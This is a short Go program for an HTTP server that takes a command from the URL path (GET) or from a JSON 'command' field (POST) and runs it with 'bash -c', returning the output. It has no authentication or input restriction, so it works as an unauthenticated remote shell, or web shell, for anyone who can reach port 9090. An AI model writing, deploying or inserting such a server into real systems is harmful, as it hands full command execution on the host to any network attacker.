package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

var command string

// CommandJSON returns string with command from JSON
type CommandJSON struct {
	Cmd string `json:"command"`
}

// ServeGET formats comma separated string to command string
func ServeGET(r *http.Request) (string, error) {
	GETCommand := strings.Replace(r.URL.Path, "/", "", 1)
	len := len(GETCommand)
	var args []string
	var command string
	if len > 1 {
		args = strings.Split(GETCommand, ",")
	} else {
		args = append(args, "ls")
		args = append(args, "-al")
	}
	command = fmt.Sprintf("/usr/bin/which")
	out, err := exec.Command(command, args[0]).Output()
	if err != nil {
		return "", err
	}
	realCommand := strings.Split(string(out), "\n")[0]
	args[0] = realCommand
	return fmt.Sprintf("%s", strings.Join(args, " ")), nil
}

// ServePOST unmarshalls string from JSON POST
func ServePOST(r *http.Request) (string, error) {
	var comStruct CommandJSON
	for key := range r.Form {
		err := json.Unmarshal([]byte(key), &comStruct)
		if err != nil {
			return "", err
		}
	}
	return comStruct.Cmd, nil
}

func commandExecute(w http.ResponseWriter, r *http.Request) {
	var command string
	var err error
	r.ParseForm()
	if r.Method == "GET" {
		command, err = ServeGET(r)
		if err != nil {
			errorString := fmt.Sprintf("\nError while executing which command: %s\n", err)
			fmt.Print(errorString)
			fmt.Fprint(w, errorString)
		}
	} else if r.Method == "POST" {
		command, err = ServePOST(r)
		if err != nil {
			errorString := fmt.Sprintf("\nError while parsing POST data: %s\n", err)
			fmt.Print(errorString)
			fmt.Fprint(w, errorString)
		}
	}

	outputHeader := fmt.Sprintf("Command:\t%s\n", command)
	outCommand, err := exec.Command("bash", "-c", command).Output()
	if err != nil {
		errorString := fmt.Sprintf("\nError in exec: %s\n", err)
		fmt.Printf(errorString)
		fmt.Fprintf(w, errorString)
	}
	formattedOutput := fmt.Sprintf(
		"\nMethod:\t\t%s\n%sResult:\n\n%s\n", r.Method, outputHeader, string(outCommand))
	fmt.Print(formattedOutput)
	fmt.Fprintf(w, formattedOutput)
}

func main() {
	http.HandleFunc("/", commandExecute)
	port := 9090
	listenPort := fmt.Sprintf(":%d", port)
	err := http.ListenAndServe(listenPort, nil)
	fmt.Printf("Listen port: %d", port)
	if err != nil {
		fmt.Printf("ListenAndServer Fatal: %s", err)
	}

}
